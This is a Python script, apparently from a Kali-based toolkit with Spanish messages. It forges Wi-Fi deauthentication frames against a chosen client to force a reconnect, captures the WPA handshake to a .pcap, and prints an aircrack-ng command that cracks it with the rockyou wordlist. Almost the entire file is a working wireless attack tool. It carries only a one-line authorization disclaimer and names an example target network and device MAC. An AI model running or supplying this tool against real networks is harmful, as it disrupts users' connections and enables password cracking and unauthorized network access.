#!/usr/bin/env python3
"""
Capture a complete WPA 4-way handshake for ONE target network by de-authing a
specific client so it reconnects, then save a .pcap ready for aircrack-ng/hashcat.

    sudo python3 -m wifi_deauth.capture_handshake wlan1 \
        --ssid "Totalplay-2.4G-1d28" --client 6c:22:1a:c3:57:66

Only use on networks you own or are authorized to test.
"""

import os
import sys
import time
import argparse
import threading

try:
    from .gui import set_channel, get_supported_channels, interface_mode, enable_monitor_mode
except ImportError:
    from gui import set_channel, get_supported_channels, interface_mode, enable_monitor_mode

from scapy.all import sniff, sendp, wrpcap, RadioTap
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth
from scapy.layers.eap import EAPOL

STATE = {
    "bssid": None, "channel": None, "ssid": None,
    "from_ap": False, "from_client": False,   # saw an AP->client and a client->AP EAPOL-Key
    "packets": [], "beacon": None, "nbeacon": 0, "stop": False,
}


def _eapol_msg(pkt, bssid, client):
    """Return 'ap' / 'client' / None for an EAPOL-Key frame of this pair."""
    if not pkt.haslayer(EAPOL):
        return None
    src = str(pkt.addr2) if pkt.addr2 else ""
    dst = str(pkt.addr1) if pkt.addr1 else ""
    pair = {src, dst}
    if pair != {bssid, client}:
        return None
    try:
        raw = bytes(pkt[EAPOL])
        # EAPOL header is 4 bytes; key descriptor type 1 byte; key info 2 bytes
        key_info = int.from_bytes(raw[5:7], "big")
    except Exception:
        return None
    mic = bool(key_info & 0x0100)
    ack = bool(key_info & 0x0080)
    if src == bssid and ack:
        return "ap"        # M1 / M3 (carries ANonce)
    if src == client and mic:
        return "client"    # M2 / M4 (carries MIC)
    return None


def _discover(iface, ssid, client, secs=1.2):
    """Find the target AP's BSSID and channel from its beacon (by SSID) or from the
    client's traffic. Returns True once found."""
    channels = get_supported_channels(iface)

    def cb(pkt):
        try:
            if pkt.haslayer(Dot11Beacon):
                name = pkt[Dot11Elt].info.strip(b"\x00").decode("utf-8", "ignore").strip()
                if ssid and name == ssid:
                    STATE["bssid"] = str(pkt.addr3)
                    STATE["ssid"] = name
                    STATE["channel"] = STATE["channel"] or _CUR[0]
                    STATE["beacon"] = pkt
                    return True
            # fall back: find the client's AP from a data frame
            if client and pkt.haslayer(Dot11):
                addrs = [str(a) for a in (pkt.addr1, pkt.addr2, pkt.addr3) if a]
                if client in addrs:
                    for a in addrs:
                        if a != client and a != "ff:ff:ff:ff:ff:ff":
                            # the AP is whichever of the others we also see beaconing;
                            # accept addr3 (BSSID) as the AP
                            STATE["bssid"] = str(pkt.addr3)
                            STATE["channel"] = _CUR[0]
        except Exception:
            pass
        return False

    print(f"[*] Buscando la red (ssid={ssid!r} / cliente={client})...")
    for ch in channels:
        if STATE["bssid"] and STATE["channel"]:
            break
        set_channel(iface, ch)
        _CUR[0] = ch
        sniff(iface=iface, prn=cb, timeout=secs,
              stop_filter=lambda p: bool(STATE["bssid"] and STATE["channel"]), store=False)
    return bool(STATE["bssid"] and STATE["channel"])


_CUR = [0]


def _send_deauth(iface, bssid, client, n=5):
    for _ in range(n):
        # AP -> client and client -> AP, reason 7
        sendp(RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7),
              iface=iface, verbose=0)
        sendp(RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth(reason=7),
              iface=iface, verbose=0)


def main():
    ap = argparse.ArgumentParser(description="Capture a WPA handshake for one network")
    ap.add_argument("iface", nargs="?", default="wlan1")
    ap.add_argument("--ssid", default=None, help="target network name (helps locate it)")
    ap.add_argument("--bssid", default=None, help="target AP BSSID (skip discovery)")
    ap.add_argument("--channel", type=int, default=None, help="target channel (skip discovery)")
    ap.add_argument("--client", required=True, help="client MAC to de-auth (your device)")
    ap.add_argument("--timeout", type=int, default=120, help="max seconds to try")
    ap.add_argument("--out", default="/home/kali/Descargas", help="where to save the .pcap")
    args = ap.parse_args()

    if os.geteuid() != 0:
        sys.exit("Debe ejecutarse como root (sudo).")

    iface = args.iface
    client = args.client.lower()
    if interface_mode(iface) != "monitor":
        print(f"[*] {iface} no está en monitor; activando...")
        if not enable_monitor_mode(iface):
            sys.exit(f"No pude poner {iface} en monitor.")

    if args.bssid and args.channel:
        STATE["bssid"] = args.bssid.lower()
        STATE["channel"] = args.channel
        STATE["ssid"] = args.ssid
    else:
        if not _discover(iface, args.ssid, client):
            sys.exit("No encontré la red. Pasa --bssid y --channel a mano, o acércate.")

    bssid = STATE["bssid"].lower()
    ch = STATE["channel"]
    print(f"[*] Objetivo: {STATE['ssid'] or '?'}  BSSID={bssid}  canal={ch}  cliente={client}")
    set_channel(iface, ch)

    def cb(pkt):
        try:
            # keep several beacons for the ESSID (aircrack needs it as the PBKDF2 salt)
            if pkt.haslayer(Dot11Beacon) and str(pkt.addr3).lower() == bssid:
                if STATE["beacon"] is None:
                    STATE["beacon"] = pkt
                if STATE["nbeacon"] < 10:
                    STATE["packets"].append(pkt)
                    STATE["nbeacon"] += 1
            kind = _eapol_msg(pkt, bssid, client)
            if kind:
                STATE["packets"].append(pkt)
                if kind == "ap":
                    STATE["from_ap"] = True
                    print("\n[+] EAPOL del AP (M1/M3) capturado")
                else:
                    STATE["from_client"] = True
                    print("\n[+] EAPOL del cliente (M2/M4) capturado")
        except Exception:
            pass

    # sniffer thread
    def _done():
        return STATE["from_ap"] and STATE["from_client"] and STATE["beacon"] is not None

    def sniffer():
        sniff(iface=iface, prn=cb, store=False,
              stop_filter=lambda p: STATE["stop"] or _done())
    t = threading.Thread(target=sniffer, daemon=True)
    t.start()

    print(f"[*] De-autheando a {client} para forzar reconexión (Ctrl-C para parar)...")
    start = time.time()
    try:
        while not _done():
            if time.time() - start > args.timeout:
                print("\n[!] Tiempo agotado sin handshake completo.")
                break
            _send_deauth(iface, bssid, client, n=4)
            print(f"\r[*] intentando... {int(time.time() - start)}s  "
                  f"AP={'sí' if STATE['from_ap'] else 'no'}  "
                  f"cliente={'sí' if STATE['from_client'] else 'no'}   ", end="")
            sys.stdout.flush()
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n[*] Cortado por el usuario.")
    STATE["stop"] = True
    time.sleep(1)

    print()
    if not STATE["packets"]:
        sys.exit("No se capturó nada.")
    os.makedirs(args.out, exist_ok=True)
    safe = (STATE["ssid"] or bssid).replace(" ", "_").replace("/", "_")
    path = os.path.join(args.out, f"handshake-{safe}-{bssid.replace(':', '')}.pcap")
    wrpcap(path, STATE["packets"])
    ok = STATE["from_ap"] and STATE["from_client"]
    print("=" * 70)
    if ok:
        print(f"[+] Handshake COMPLETO (M1+M2) guardado en:\n    {path}")
        print(f"[+] Crackea con:\n    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt "
              f"-b {bssid} '{path}'")
    else:
        print(f"[!] Handshake INCOMPLETO (AP={STATE['from_ap']} cliente={STATE['from_client']}).")
        print(f"    Guardado igualmente en {path}. Acércate a la cámara y reintenta "
              f"(su respuesta M2 llega débil si está lejos).")
    print("=" * 70)


if __name__ == "__main__":
    main()
